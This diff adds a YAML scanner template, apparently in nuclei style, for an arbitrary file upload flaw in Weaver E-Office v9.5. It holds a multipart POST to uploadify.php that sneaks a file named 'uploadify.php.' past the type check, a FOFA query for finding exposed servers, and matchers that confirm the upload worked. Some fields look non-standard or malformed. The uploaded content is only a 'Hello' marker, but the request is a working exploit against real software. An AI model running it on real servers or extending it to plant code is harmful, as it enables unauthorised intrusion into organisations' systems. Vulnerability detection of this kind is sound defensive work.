@@ -1,0 +1,56 @@
+id: 泛微E-Office v9.5文件上传
+time: '2023-05-17'
+
+
+info:
+  name: 泛微E-Office v9.5文件上传
+  severity: high
+  description: 泛微-EOffice,自定义函数doc2txt导致的任意文件上传
+  reference: https://github.com/sunyixuan1228/cve/blob/main/weaver.md
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/inc/jquery/uploadify/uploadify.php"
+      - "{{BaseURL}}/attachment/path/uploadify.php"
+
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Accept-Encoding:gzip, deflate
+        
+    body: 
+      - |
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+        Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
+        Content-Type:image/jpeg
+        
+        Hello
+        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Hello"
+
+      - type: status
+        status:
+          - 200
+    
+    extractors:
+      - name: 
+          - path
+        part: 
+          - path
+        time: 
+          - 1
+        regex:
+          - '(.*)'
